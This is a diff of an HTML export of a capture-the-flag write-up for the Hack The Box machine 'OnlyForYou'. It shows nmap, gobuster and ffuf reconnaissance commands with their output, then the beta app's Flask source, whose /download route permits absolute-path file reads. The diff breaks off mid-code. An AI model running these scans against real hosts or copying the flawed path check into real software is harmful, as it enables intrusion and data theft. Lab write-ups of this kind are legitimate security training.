@@ -3,7 +3,7 @@
 "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
 <html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en">
 <head>
-<!-- 2023-07-14 Fri 07:43 -->
+<!-- 2023-07-14 Fri 07:50 -->
 <meta http-equiv="Content-Type" content="text/html;charset=utf-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
 <title>OnlyForYou</title>
@@ -29,56 +29,56 @@
 <h2>Table of Contents</h2>
 <div id="text-table-of-contents" role="doc-toc">
 <ul>
-<li><a href="#orge956a9c">Notes</a>
+<li><a href="#orgc2bb44a">Notes</a>
 <ul>
-<li><a href="#orge4e4a0a">Scans</a>
+<li><a href="#org4f39ea6">Scans</a>
 <ul>
-<li><a href="#org4ddd2b5">nmap</a></li>
-<li><a href="#org51e47a2">Attempted Gobust</a></li>
-<li><a href="#org34a42f8">Finding subdomains with ffuf</a></li>
+<li><a href="#org092fee3">nmap</a></li>
+<li><a href="#org2bd0b16">Attempted Gobust</a></li>
+<li><a href="#org971e98d">Finding subdomains with ffuf</a></li>
 </ul>
 </li>
-<li><a href="#org46a942a">beta.only4you.htb</a>
+<li><a href="#orged2664f">beta.only4you.htb</a>
 <ul>
-<li><a href="#org2b68c3e">beta.only4you.htb source code.</a></li>
-<li><a href="#org4095108">LFI and Foothold</a></li>
+<li><a href="#org9ff536e">beta.only4you.htb source code.</a></li>
+<li><a href="#org42e1e4e">LFI and Foothold</a></li>
 </ul>
 </li>
-<li><a href="#orgfb8b4b0">Foothold enumeration</a>
+<li><a href="#org8187cdc">Foothold enumeration</a>
 <ul>
-<li><a href="#orga2d6ab9">Inspecting the ports</a></li>
+<li><a href="#orgcfadde6">Inspecting the ports</a></li>
 </ul>
 </li>
-<li><a href="#org2197e57">onlyforyou</a></li>
-<li><a href="#org344ec04">root.</a></li>
+<li><a href="#org847394d">onlyforyou</a></li>
+<li><a href="#orgb49ec4d">root.</a></li>
 </ul>
 </li>
 </ul>
 </div>
 </div>
 
-<div id="outline-container-orge956a9c" class="outline-2">
-<h2 id="orge956a9c">Notes</h2>
-<div class="outline-text-2" id="text-orge956a9c">
+<div id="outline-container-orgc2bb44a" class="outline-2">
+<h2 id="orgc2bb44a">Notes</h2>
+<div class="outline-text-2" id="text-orgc2bb44a">
 <ul class="org-ul">
 <li>Difficulty: medium, hard if you mess the enumeration up.</li>
 </ul>
 </div>
 
 
-<div id="outline-container-orge4e4a0a" class="outline-3">
-<h3 id="orge4e4a0a">Scans</h3>
-<div class="outline-text-3" id="text-orge4e4a0a">
+<div id="outline-container-org4f39ea6" class="outline-3">
+<h3 id="org4f39ea6">Scans</h3>
+<div class="outline-text-3" id="text-org4f39ea6">
 </div>
-<div id="outline-container-org4ddd2b5" class="outline-4">
-<h4 id="org4ddd2b5">nmap</h4>
-<div class="outline-text-4" id="text-org4ddd2b5">
+<div id="outline-container-org092fee3" class="outline-4">
+<h4 id="org092fee3">nmap</h4>
+<div class="outline-text-4" id="text-org092fee3">
 <p>
 As always start off with the nmap.
 </p>
 
 <div class="org-src-container">
-<pre class="src src-sh"><span style="color: #ffd400;">sudo</span> nmap -A -oA scans/onlyForyou 10.129.62.243
+<pre class="src src-sh">sudo nmap -A -oA scans/onlyForyou 10.129.62.243
 </pre>
 </div>
 
@@ -87,7 +87,7 @@ The nmap flag <code>-A</code> enables os detection, version detection and script
 Flag <code>-oA</code> outputs in all formats.
 </p>
 
-<pre class="example" id="org1741373">
+<pre class="example" id="org186b7d9">
 Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-22 15:44 EDT
 Nmap scan report for 10.129.62.243
 Host is up (0.12s latency).
@@ -131,7 +131,7 @@ From the Nmap scan, only two ports are exposed: 22 and 80.
 Additionally, there is a domain called <code>only4you.htb</code>. Please add this domain to your <code>/etc/hosts</code> file.
 </p>
 
-<pre class="example" id="org6b00ee8">
+<pre class="example" id="orgf130505">
 10.129.62.243 only4you.htb
 </pre>
 
@@ -140,18 +140,18 @@ The server is running Nginx, which is a newer version. It is unlikely that there
 </p>
 </div>
 </div>
-<div id="outline-container-org51e47a2" class="outline-4">
-<h4 id="org51e47a2">Attempted Gobust</h4>
-<div class="outline-text-4" id="text-org51e47a2">
+<div id="outline-container-org2bd0b16" class="outline-4">
+<h4 id="org2bd0b16">Attempted Gobust</h4>
+<div class="outline-text-4" id="text-org2bd0b16">
 <p>
-Whenever I encounter a web service on an HTB machine, I always run Gobuster to search for hidden directories or files. However, on this machine, there doesn&rsquo;t seem to be much to find using Gobuster.
+Whenever I encounter a web service on an HTB machine, I always run Gobuster to search for hidden directories or files. However, on this machine, there doesn't seem to be much to find using Gobuster.
 </p>
 
 <div class="org-src-container">
 <pre class="src src-sh">gobuster dir -w ~/wordlists/Discovery/Web-Content/big.txt --url http://only4you.htb/ -o scans/only4you.gobust
 </pre>
 </div>
-<pre class="example" id="org31c6681">
+<pre class="example" id="org891796d">
 ===============================================================
 Gobuster v3.5
 by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
@@ -175,9 +175,9 @@ Progress: 20459 / 20476 (99.92%)
 </div>
 
 
-<div id="outline-container-org34a42f8" class="outline-4">
-<h4 id="org34a42f8">Finding subdomains with ffuf</h4>
-<div class="outline-text-4" id="text-org34a42f8">
+<div id="outline-container-org971e98d" class="outline-4">
+<h4 id="org971e98d">Finding subdomains with ffuf</h4>
+<div class="outline-text-4" id="text-org971e98d">
 <p>
 Thanks to the great work of IppSec, I learned a useful trick that will help me on future HTB boxes.<sup><a id="fnr.1" class="footref" href="#fn.1" role="doc-backlink">1</a></sup>
 </p>
@@ -186,10 +186,10 @@ Thanks to the great work of IppSec, I learned a useful trick that will help me o
 I had to filter out status code 301.
 </p>
 <div class="org-src-container">
-<pre class="src src-sh">ffuf -u http://10.129.62.243 -H <span style="color: #7984D1;">"Host: FUZZ.only4you.htb"</span> -w ~/wordlists/Discovery/DNS/subdomains-top1million-110000.txt -fc <span style="color: #ffd400; font-weight: bold;">301</span>
+<pre class="src src-sh">ffuf -u http://10.129.62.243 -H <span style="font-style: italic;">"Host: FUZZ.only4you.htb"</span> -w ~/wordlists/Discovery/DNS/subdomains-top1million-110000.txt -fc 301
 </pre>
 </div>
-<pre class="example" id="orgd870ed8">
+<pre class="example" id="org27a28e5">
 
         /'___\  /'___\           /'___\
        /\ \__/ /\ \__/  __  __  /\ \__/
@@ -225,165 +225,165 @@ I have found a new subdomain - <code>beta.only4you.htb</code>. Please add this t
 </div>
 </div>
 </div>
-<div id="outline-container-org46a942a" class="outline-3">
-<h3 id="org46a942a">beta.only4you.htb</h3>
-<div class="outline-text-3" id="text-org46a942a">
+<div id="outline-container-orged2664f" class="outline-3">
+<h3 id="orged2664f">beta.only4you.htb</h3>
+<div class="outline-text-3" id="text-orged2664f">
 <p>
-Now that we have found the subdomain, it&rsquo;s time to explore it. The subdomain hosts an image converting web app, and the source code for the app is a simple Flask web app.
+Now that we have found the subdomain, it's time to explore it. The subdomain hosts an image converting web app, and the source code for the app is a simple Flask web app.
 </p>
 
 <p>
-<b>NOTE</b>: It&rsquo;s worth mentioning that during my investigation, I discovered that the Python Pillow library can run Ghostscript, which led me down a deep rabbit hole of exploration. However, this information is not included in this report.
+<b>NOTE</b>: It's worth mentioning that during my investigation, I discovered that the Python Pillow library can run Ghostscript, which led me down a deep rabbit hole of exploration. However, this information is not included in this report.
 </p>
 </div>
 
-<div id="outline-container-org2b68c3e" class="outline-4">
-<h4 id="org2b68c3e">beta.only4you.htb source code.</h4>
-<div class="outline-text-4" id="text-org2b68c3e">
+<div id="outline-container-org9ff536e" class="outline-4">
+<h4 id="org9ff536e">beta.only4you.htb source code.</h4>
+<div class="outline-text-4" id="text-org9ff536e">
 <p>
 Here is the app.py file, which contains all of the logic for routing within the web application.
 </p>
 <div class="org-src-container">
-<pre class="src src-python"><span style="color: #ff2afc; font-weight: bold;">from</span> flask <span style="color: #ff2afc; font-weight: bold;">import</span> Flask, request, send_file, render_template, flash, redirect, send_from_directory
-<span style="color: #ff2afc; font-weight: bold;">import</span> os, uuid, posixpath
-<span style="color: #ff2afc; font-weight: bold;">from</span> werkzeug.utils <span style="color: #ff2afc; font-weight: bold;">import</span> secure_filename
-<span style="color: #ff2afc; font-weight: bold;">from</span> pathlib <span style="color: #ff2afc; font-weight: bold;">import</span> Path
-<span style="color: #ff2afc; font-weight: bold;">from</span> tool <span style="color: #ff2afc; font-weight: bold;">import</span> convertjp, convertpj, resizeimg
+<pre class="src src-python"><span style="font-weight: bold;">from</span> flask <span style="font-weight: bold;">import</span> Flask, request, send_file, render_template, flash, redirect, send_from_directory
+<span style="font-weight: bold;">import</span> os, uuid, posixpath
+<span style="font-weight: bold;">from</span> werkzeug.utils <span style="font-weight: bold;">import</span> secure_filename
+<span style="font-weight: bold;">from</span> pathlib <span style="font-weight: bold;">import</span> Path
+<span style="font-weight: bold;">from</span> tool <span style="font-weight: bold;">import</span> convertjp, convertpj, resizeimg
 
-<span style="color: #df85ff;">app</span> = Flask(<span style="color: #1ea8fc;">__name__</span>)
-app.<span style="color: #df85ff;">secret_key</span> = uuid.uuid4().<span style="color: #1ea8fc;">hex</span>
-app.<span style="color: #df85ff;">config</span>[<span style="color: #7984D1;">'MAX_CONTENT_LENGTH'</span>] = <span style="color: #ffd400; font-weight: bold;">1024</span> * <span style="color: #ffd400; font-weight: bold;">1024</span>
-app.<span style="color: #df85ff;">config</span>[<span style="color: #7984D1;">'RESIZE_FOLDER'</span>] = <span style="color: #7984D1;">'uploads/resize'</span>
-app.<span style="color: #df85ff;">config</span>[<span style="color: #7984D1;">'CONVERT_FOLDER'</span>] = <span style="color: #7984D1;">'uploads/convert'</span>
-app.<span style="color: #df85ff;">config</span>[<span style="color: #7984D1;">'LIST_FOLDER'</span>] = <span style="color: #7984D1;">'uploads/list'</span>
-app.<span style="color: #df85ff;">config</span>[<span style="color: #7984D1;">'UPLOAD_EXTENSIONS'</span>] = [<span style="color: #7984D1;">'.jpg'</span>, <span style="color: #7984D1;">'.png'</span>]
+<span style="font-weight: bold; font-style: italic;">app</span> = Flask(<span style="font-weight: bold;">__name__</span>)
+app.<span style="font-weight: bold; font-style: italic;">secret_key</span> = uuid.uuid4().<span style="font-weight: bold;">hex</span>
+app.<span style="font-weight: bold; font-style: italic;">config</span>[<span style="font-style: italic;">'MAX_CONTENT_LENGTH'</span>] = 1024 * 1024
+app.<span style="font-weight: bold; font-style: italic;">config</span>[<span style="font-style: italic;">'RESIZE_FOLDER'</span>] = <span style="font-style: italic;">'uploads/resize'</span>
+app.<span style="font-weight: bold; font-style: italic;">config</span>[<span style="font-style: italic;">'CONVERT_FOLDER'</span>] = <span style="font-style: italic;">'uploads/convert'</span>
+app.<span style="font-weight: bold; font-style: italic;">config</span>[<span style="font-style: italic;">'LIST_FOLDER'</span>] = <span style="font-style: italic;">'uploads/list'</span>
+app.<span style="font-weight: bold; font-style: italic;">config</span>[<span style="font-style: italic;">'UPLOAD_EXTENSIONS'</span>] = [<span style="font-style: italic;">'.jpg'</span>, <span style="font-style: italic;">'.png'</span>]
 
-<span style="color: #ffd400;">@app.route</span>(<span style="color: #7984D1;">'/'</span>, methods=[<span style="color: #7984D1;">'GET'</span>])
-<span style="color: #ff2afc; font-weight: bold;">def</span> <span style="color: #42c6ff;">main</span>():
-    <span style="color: #ff2afc; font-weight: bold;">return</span> render_template(<span style="color: #7984D1;">'index.html'</span>)
+<span style="font-weight: bold; text-decoration: underline;">@app.route</span>(<span style="font-style: italic;">'/'</span>, methods=[<span style="font-style: italic;">'GET'</span>])
+<span style="font-weight: bold;">def</span> <span style="font-weight: bold;">main</span>():
+    <span style="font-weight: bold;">return</span> render_template(<span style="font-style: italic;">'index.html'</span>)
 
-<span style="color: #ffd400;">@app.route</span>(<span style="color: #7984D1;">'/resize'</span>, methods=[<span style="color: #7984D1;">'POST'</span>, <span style="color: #7984D1;">'GET'</span>])
-<span style="color: #ff2afc; font-weight: bold;">def</span> <span style="color: #42c6ff;">resize</span>():
-    <span style="color: #ff2afc; font-weight: bold;">if</span> request.method == <span style="color: #7984D1;">'POST'</span>:
-        <span style="color: #ff2afc; font-weight: bold;">if</span> <span style="color: #7984D1;">'file'</span> <span style="color: #ff2afc; font-weight: bold;">not</span> <span style="color: #ff2afc; font-weight: bold;">in</span> request.files:
-            flash(<span style="color: #7984D1;">'Something went wrong, Try again!'</span>, <span style="color: #7984D1;">'danger'</span>)
-            <span style="color: #ff2afc; font-weight: bold;">return</span> redirect(request.url)
-        <span style="color: #1ea8fc;">file</span> = request.files[<span style="color: #7984D1;">'file'</span>]
-        img = secure_filename(<span style="color: #1ea8fc;">file</span>.filename)
-        <span style="color: #ff2afc; font-weight: bold;">if</span> img != <span style="color: #7984D1;">''</span>:
-            ext = os.path.splitext(img)[<span style="color: #ffd400; font-weight: bold;">1</span>]
-            <span style="color: #ff2afc; font-weight: bold;">if</span> ext <span style="color: #ff2afc; font-weight: bold;">not</span> <span style="color: #ff2afc; font-weight: bold;">in</span> app.config[<span style="color: #7984D1;">'UPLOAD_EXTENSIONS'</span>]:
-                flash(<span style="color: #7984D1;">'Only png and jpg images are allowed!'</span>, <span style="color: #7984D1;">'danger'</span>)
-                <span style="color: #ff2afc; font-weight: bold;">return</span> redirect(request.url)
-            <span style="color: #1ea8fc;">file</span>.save(os.path.join(app.config[<span style="color: #7984D1;">'RESIZE_FOLDER'</span>], img))
+<span style="font-weight: bold; text-decoration: underline;">@app.route</span>(<span style="font-style: italic;">'/resize'</span>, methods=[<span style="font-style: italic;">'POST'</span>, <span style="font-style: italic;">'GET'</span>])
+<span style="font-weight: bold;">def</span> <span style="font-weight: bold;">resize</span>():
+    <span style="font-weight: bold;">if</span> request.method == <span style="font-style: italic;">'POST'</span>:
+        <span style="font-weight: bold;">if</span> <span style="font-style: italic;">'file'</span> <span style="font-weight: bold;">not</span> <span style="font-weight: bold;">in</span> request.files:
+            flash(<span style="font-style: italic;">'Something went wrong, Try again!'</span>, <span style="font-style: italic;">'danger'</span>)
+            <span style="font-weight: bold;">return</span> redirect(request.url)
+        <span style="font-weight: bold;">file</span> = request.files[<span style="font-style: italic;">'file'</span>]
+        img = secure_filename(<span style="font-weight: bold;">file</span>.filename)
+        <span style="font-weight: bold;">if</span> img != <span style="font-style: italic;">''</span>:
+            ext = os.path.splitext(img)[1]
+            <span style="font-weight: bold;">if</span> ext <span style="font-weight: bold;">not</span> <span style="font-weight: bold;">in</span> app.config[<span style="font-style: italic;">'UPLOAD_EXTENSIONS'</span>]:
+                flash(<span style="font-style: italic;">'Only png and jpg images are allowed!'</span>, <span style="font-style: italic;">'danger'</span>)
+                <span style="font-weight: bold;">return</span> redirect(request.url)
+            <span style="font-weight: bold;">file</span>.save(os.path.join(app.config[<span style="font-style: italic;">'RESIZE_FOLDER'</span>], img))
             status = resizeimg(img)
-            <span style="color: #ff2afc; font-weight: bold;">if</span> status == <span style="color: #df85ff; font-weight: bold;">False</span>:
-                flash(<span style="color: #7984D1;">'Image is too small! Minimum size needs to be 700x700'</span>, <span style="color: #7984D1;">'danger'</span>)
-                <span style="color: #ff2afc; font-weight: bold;">return</span> redirect(request.url)
-            <span style="color: #ff2afc; font-weight: bold;">else</span>:
-                flash(<span style="color: #7984D1;">'Image is succesfully uploaded!'</span>, <span style="color: #7984D1;">'success'</span>)
-        <span style="color: #ff2afc; font-weight: bold;">else</span>:
-            flash(<span style="color: #7984D1;">'No image selected!'</span>, <span style="color: #7984D1;">'danger'</span>)
-            <span style="color: #ff2afc; font-weight: bold;">return</span> redirect(request.url)
-        <span style="color: #ff2afc; font-weight: bold;">return</span> render_template(<span style="color: #7984D1;">'resize.html'</span>, clicked=<span style="color: #7984D1;">"True"</span>), {<span style="color: #7984D1;">"Refresh"</span>: <span style="color: #7984D1;">"5; url=/list"</span>}
-    <span style="color: #ff2afc; font-weight: bold;">else</span>:
-        <span style="color: #ff2afc; font-weight: bold;">return</span> render_template(<span style="color: #7984D1;">'resize.html'</span>, clicked=<span style="color: #7984D1;">"False"</span>)
+            <span style="font-weight: bold;">if</span> status == <span style="font-weight: bold; text-decoration: underline;">False</span>:
+                flash(<span style="font-style: italic;">'Image is too small! Minimum size needs to be 700x700'</span>, <span style="font-style: italic;">'danger'</span>)
+                <span style="font-weight: bold;">return</span> redirect(request.url)
+            <span style="font-weight: bold;">else</span>:
+                flash(<span style="font-style: italic;">'Image is succesfully uploaded!'</span>, <span style="font-style: italic;">'success'</span>)
+        <span style="font-weight: bold;">else</span>:
+            flash(<span style="font-style: italic;">'No image selected!'</span>, <span style="font-style: italic;">'danger'</span>)
+            <span style="font-weight: bold;">return</span> redirect(request.url)
+        <span style="font-weight: bold;">return</span> render_template(<span style="font-style: italic;">'resize.html'</span>, clicked=<span style="font-style: italic;">"True"</span>), {<span style="font-style: italic;">"Refresh"</span>: <span style="font-style: italic;">"5; url=/list"</span>}
+    <span style="font-weight: bold;">else</span>:
+        <span style="font-weight: bold;">return</span> render_template(<span style="font-style: italic;">'resize.html'</span>, clicked=<span style="font-style: italic;">"False"</span>)
 
-<span style="color: #ffd400;">@app.route</span>(<span style="color: #7984D1;">'/convert'</span>, methods=[<span style="color: #7984D1;">'POST'</span>, <span style="color: #7984D1;">'GET'</span>])
-<span style="color: #ff2afc; font-weight: bold;">def</span> <span style="color: #42c6ff;">convert</span>():
-    <span style="color: #ff2afc; font-weight: bold;">if</span> request.method == <span style="color: #7984D1;">'POST'</span>:
-        <span style="color: #ff2afc; font-weight: bold;">if</span> <span style="color: #7984D1;">'file'</span> <span style="color: #ff2afc; font-weight: bold;">not</span> <span style="color: #ff2afc; font-weight: bold;">in</span> request.files:
-            flash(<span style="color: #7984D1;">'Something went wrong, Try again!'</span>, <span style="color: #7984D1;">'danger'</span>)
-            <span style="color: #ff2afc; font-weight: bold;">return</span> redirect(request.url)
-        <span style="color: #1ea8fc;">file</span> = request.files[<span style="color: #7984D1;">'file'</span>]
-        img = secure_filename(<span style="color: #1ea8fc;">file</span>.filename)
-        <span style="color: #ff2afc; font-weight: bold;">if</span> img != <span style="color: #7984D1;">''</span>:
-            ext = os.path.splitext(img)[<span style="color: #ffd400; font-weight: bold;">1</span>]
-            <span style="color: #ff2afc; font-weight: bold;">if</span> ext <span style="color: #ff2afc; font-weight: bold;">not</span> <span style="color: #ff2afc; font-weight: bold;">in</span> app.config[<span style="color: #7984D1;">'UPLOAD_EXTENSIONS'</span>]:
-                flash(<span style="color: #7984D1;">'Only jpg and png images are allowed!'</span>, <span style="color: #7984D1;">'danger'</span>)
-                <span style="color: #ff2afc; font-weight: bold;">return</span> redirect(request.url)
-            <span style="color: #1ea8fc;">file</span>.save(os.path.join(app.config[<span style="color: #7984D1;">'CONVERT_FOLDER'</span>], img))
-            <span style="color: #ff2afc; font-weight: bold;">if</span> ext == <span style="color: #7984D1;">'.png'</span>:
+<span style="font-weight: bold; text-decoration: underline;">@app.route</span>(<span style="font-style: italic;">'/convert'</span>, methods=[<span style="font-style: italic;">'POST'</span>, <span style="font-style: italic;">'GET'</span>])
+<span style="font-weight: bold;">def</span> <span style="font-weight: bold;">convert</span>():
+    <span style="font-weight: bold;">if</span> request.method == <span style="font-style: italic;">'POST'</span>:
+        <span style="font-weight: bold;">if</span> <span style="font-style: italic;">'file'</span> <span style="font-weight: bold;">not</span> <span style="font-weight: bold;">in</span> request.files:
+            flash(<span style="font-style: italic;">'Something went wrong, Try again!'</span>, <span style="font-style: italic;">'danger'</span>)
+            <span style="font-weight: bold;">return</span> redirect(request.url)
+        <span style="font-weight: bold;">file</span> = request.files[<span style="font-style: italic;">'file'</span>]
+        img = secure_filename(<span style="font-weight: bold;">file</span>.filename)
+        <span style="font-weight: bold;">if</span> img != <span style="font-style: italic;">''</span>:
+            ext = os.path.splitext(img)[1]
+            <span style="font-weight: bold;">if</span> ext <span style="font-weight: bold;">not</span> <span style="font-weight: bold;">in</span> app.config[<span style="font-style: italic;">'UPLOAD_EXTENSIONS'</span>]:
+                flash(<span style="font-style: italic;">'Only jpg and png images are allowed!'</span>, <span style="font-style: italic;">'danger'</span>)
+                <span style="font-weight: bold;">return</span> redirect(request.url)
+            <span style="font-weight: bold;">file</span>.save(os.path.join(app.config[<span style="font-style: italic;">'CONVERT_FOLDER'</span>], img))
+            <span style="font-weight: bold;">if</span> ext == <span style="font-style: italic;">'.png'</span>:
                 image = convertpj(img)
-                <span style="color: #ff2afc; font-weight: bold;">return</span> send_from_directory(app.config[<span style="color: #7984D1;">'CONVERT_FOLDER'</span>], image, as_attachment=<span style="color: #df85ff; font-weight: bold;">True</span>)
-            <span style="color: #ff2afc; font-weight: bold;">else</span>:
+                <span style="font-weight: bold;">return</span> send_from_directory(app.config[<span style="font-style: italic;">'CONVERT_FOLDER'</span>], image, as_attachment=<span style="font-weight: bold; text-decoration: underline;">True</span>)
+            <span style="font-weight: bold;">else</span>:
                 image = convertjp(img)
-                <span style="color: #ff2afc; font-weight: bold;">return</span> send_from_directory(app.config[<span style="color: #7984D1;">'CONVERT_FOLDER'</span>], image, as_attachment=<span style="color: #df85ff; font-weight: bold;">True</span>)
-        <span style="color: #ff2afc; font-weight: bold;">else</span>:
-            flash(<span style="color: #7984D1;">'No image selected!'</span>, <span style="color: #7984D1;">'danger'</span>)
-            <span style="color: #ff2afc; font-weight: bold;">return</span> redirect(request.url)
-        <span style="color: #ff2afc; font-weight: bold;">return</span> render_template(<span style="color: #7984D1;">'convert.html'</span>)
-    <span style="color: #ff2afc; font-weight: bold;">else</span>:
-        [f.unlink() <span style="color: #ff2afc; font-weight: bold;">for</span> f <span style="color: #ff2afc; font-weight: bold;">in</span> Path(app.config[<span style="color: #7984D1;">'CONVERT_FOLDER'</span>]).glob(<span style="color: #7984D1;">"*"</span>) <span style="color: #ff2afc; font-weight: bold;">if</span> f.is_file()]
-        <span style="color: #ff2afc; font-weight: bold;">return</span> render_template(<span style="color: #7984D1;">'convert.html'</span>)
+                <span style="font-weight: bold;">return</span> send_from_directory(app.config[<span style="font-style: italic;">'CONVERT_FOLDER'</span>], image, as_attachment=<span style="font-weight: bold; text-decoration: underline;">True</span>)
+        <span style="font-weight: bold;">else</span>:
+            flash(<span style="font-style: italic;">'No image selected!'</span>, <span style="font-style: italic;">'danger'</span>)
+            <span style="font-weight: bold;">return</span> redirect(request.url)
+        <span style="font-weight: bold;">return</span> render_template(<span style="font-style: italic;">'convert.html'</span>)
+    <span style="font-weight: bold;">else</span>:
+        [f.unlink() <span style="font-weight: bold;">for</span> f <span style="font-weight: bold;">in</span> Path(app.config[<span style="font-style: italic;">'CONVERT_FOLDER'</span>]).glob(<span style="font-style: italic;">"*"</span>) <span style="font-weight: bold;">if</span> f.is_file()]
+        <span style="font-weight: bold;">return</span> render_template(<span style="font-style: italic;">'convert.html'</span>)
 
-<span style="color: #ffd400;">@app.route</span>(<span style="color: #7984D1;">'/source'</span>)
-<span style="color: #ff2afc; font-weight: bold;">def</span> <span style="color: #42c6ff;">send_report</span>():
-    <span style="color: #ff2afc; font-weight: bold;">return</span> send_from_directory(<span style="color: #7984D1;">'static'</span>, <span style="color: #7984D1;">'source.zip'</span>, as_attachment=<span style="color: #df85ff; font-weight: bold;">True</span>)
+<span style="font-weight: bold; text-decoration: underline;">@app.route</span>(<span style="font-style: italic;">'/source'</span>)
+<span style="font-weight: bold;">def</span> <span style="font-weight: bold;">send_report</span>():
+    <span style="font-weight: bold;">return</span> send_from_directory(<span style="font-style: italic;">'static'</span>, <span style="font-style: italic;">'source.zip'</span>, as_attachment=<span style="font-weight: bold; text-decoration: underline;">True</span>)
 
-<span style="color: #ffd400;">@app.route</span>(<span style="color: #7984D1;">'/list'</span>, methods=[<span style="color: #7984D1;">'GET'</span>])
-<span style="color: #ff2afc; font-weight: bold;">def</span> <span style="color: #42c6ff;">list</span>():
-    <span style="color: #ff2afc; font-weight: bold;">return</span> render_template(<span style="color: #7984D1;">'list.html'</span>)
+<span style="font-weight: bold; text-decoration: underline;">@app.route</span>(<span style="font-style: italic;">'/list'</span>, methods=[<span style="font-style: italic;">'GET'</span>])
+<span style="font-weight: bold;">def</span> <span style="font-weight: bold;">list</span>():
+    <span style="font-weight: bold;">return</span> render_template(<span style="font-style: italic;">'list.html'</span>)
 
-<span style="color: #ffd400;">@app.route</span>(<span style="color: #7984D1;">'/download'</span>, methods=[<span style="color: #7984D1;">'POST'</span>])
-<span style="color: #ff2afc; font-weight: bold;">def</span> <span style="color: #42c6ff;">download</span>():
-    image = request.form[<span style="color: #7984D1;">'image'</span>]
+<span style="font-weight: bold; text-decoration: underline;">@app.route</span>(<span style="font-style: italic;">'/download'</span>, methods=[<span style="font-style: italic;">'POST'</span>])
+<span style="font-weight: bold;">def</span> <span style="font-weight: bold;">download</span>():
+    image = request.form[<span style="font-style: italic;">'image'</span>]
     filename = posixpath.normpath(image)
-    <span style="color: #ff2afc; font-weight: bold;">if</span> <span style="color: #7984D1;">'..'</span> <span style="color: #ff2afc; font-weight: bold;">in</span> filename <span style="color: #ff2afc; font-weight: bold;">or</span> filename.startswith(<span style="color: #7984D1;">'../'</span>):
-        flash(<span style="color: #7984D1;">'Hacking detected!'</span>, <span style="color: #7984D1;">'danger'</span>)
-        <span style="color: #ff2afc; font-weight: bold;">return</span> redirect(<span style="color: #7984D1;">'/list'</span>)
-    <span style="color: #ff2afc; font-weight: bold;">if</span> <span style="color: #ff2afc; font-weight: bold;">not</span> os.path.isabs(filename):
-        filename = os.path.join(app.config[<span style="color: #7984D1;">'LIST_FOLDER'</span>], filename)
-    <span style="color: #ff2afc; font-weight: bold;">try</span>:
-        <span style="color: #ff2afc; font-weight: bold;">if</span> <span style="color: #ff2afc; font-weight: bold;">not</span> os.path.isfile(filename):
-            flash(<span style="color: #7984D1;">'Image doesn\'t exist!'</span>, <span style="color: #7984D1;">'danger'</span>)
-            <span style="color: #ff2afc; font-weight: bold;">return</span> redirect(<span style="color: #7984D1;">'/list'</span>)
-    <span style="color: #ff2afc; font-weight: bold;">except</span> (<span style="color: #ffd400;">TypeError</span>, <span style="color: #ffd400;">ValueError</span>):
-        <span style="color: #ff2afc; font-weight: bold;">raise</span> BadRequest()
-    <span style="color: #ff2afc; font-weight: bold;">return</span> send_file(filename, as_attachment=<span style="color: #df85ff; font-weight: bold;">True</span>)
+    <span style="font-weight: bold;">if</span> <span style="font-style: italic;">'..'</span> <span style="font-weight: bold;">in</span> filename <span style="font-weight: bold;">or</span> filename.startswith(<span style="font-style: italic;">'../'</span>):
+        flash(<span style="font-style: italic;">'Hacking detected!'</span>, <span style="font-style: italic;">'danger'</span>)
+        <span style="font-weight: bold;">return</span> redirect(<span style="font-style: italic;">'/list'</span>)
+    <span style="font-weight: bold;">if</span> <span style="font-weight: bold;">not</span> os.path.isabs(filename):
+        filename = os.path.join(app.config[<span style="font-style: italic;">'LIST_FOLDER'</span>], filename)
+    <span style="font-weight: bold;">try</span>:
+        <span style="font-weight: bold;">if</span> <span style="font-weight: bold;">not</span> os.path.isfile(filename):
+            flash(<span style="font-style: italic;">'Image doesn\'t exist!'</span>, <span style="font-style: italic;">'danger'</span>)
+            <span style="font-weight: bold;">return</span> redirect(<span style="font-style: italic;">'/list'</span>)
+    <span style="font-weight: bold;">except</span> (<span style="font-weight: bold; text-decoration: underline;">TypeError</span>, <span style="font-weight: bold; text-decoration: underline;">ValueError</span>):
+        <span style="font-weight: bold;">raise</span> BadRequest()
+    <span style="font-weight: bold;">return</span> send_file(filename, as_attachment=<span style="font-weight: bold; text-decoration: underline;">True</span>)
 
-<span style="color: #ffd400;">@app.errorhandler</span>(<span style="color: #ffd400; font-weight: bold;">404</span>)
-<span style="color: #ff2afc; font-weight: bold;">def</span> <span style="color: #42c6ff;">page_not_found</span>(error):
-    <span style="color: #ff2afc; font-weight: bold;">return</span> render_template(<span style="color: #7984D1;">'404.html'</span>), <span style="color: #ffd400; font-weight: bold;">404</span>
+<span style="font-weight: bold; text-decoration: underline;">@app.errorhandler</span>(404)
+<span style="font-weight: bold;">def</span> <span style="font-weight: bold;">page_not_found</span>(error):
+    <span style="font-weight: bold;">return</span> render_template(<span style="font-style: italic;">'404.html'</span>), 404
 
-<span style="color: #ffd400;">@app.errorhandler</span>(<span style="color: #ffd400; font-weight: bold;">500</span>)
-<span style="color: #ff2afc; font-weight: bold;">def</span> <span style="color: #42c6ff;">server_error</span>(error):
-    <span style="color: #ff2afc; font-weight: bold;">return</span> render_template(<span style="color: #7984D1;">'500.html'</span>), <span style="color: #ffd400; font-weight: bold;">500</span>
+<span style="font-weight: bold; text-decoration: underline;">@app.errorhandler</span>(500)
+<span style="font-weight: bold;">def</span> <span style="font-weight: bold;">server_error</span>(error):
+    <span style="font-weight: bold;">return</span> render_template(<span style="font-style: italic;">'500.html'</span>), 500
 
-<span style="color: #ffd400;">@app.errorhandler</span>(<span style="color: #ffd400; font-weight: bold;">400</span>)
-<span style="color: #ff2afc; font-weight: bold;">def</span> <span style="color: #42c6ff;">bad_request</span>(error):
-    <span style="color: #ff2afc; font-weight: bold;">return</span> render_template(<span style="color: #7984D1;">'400.html'</span>), <span style="color: #ffd400; font-weight: bold;">400</span>
+<span style="font-weight: bold; text-decoration: underline;">@app.errorhandler</span>(400)
+<span style="font-weight: bold;">def</span> <span style="font-weight: bold;">bad_request</span>(error):
+    <span style="font-weight: bold;">return</span> render_template(<span style="font-style: italic;">'400.html'</span>), 400
 
-<span style="color: #ffd400;">@app.errorhandler</span>(<span style="color: #ffd400; font-weight: bold;">405</span>)
-<span style="color: #ff2afc; font-weight: bold;">def</span> <span style="color: #42c6ff;">method_not_allowed</span>(error):
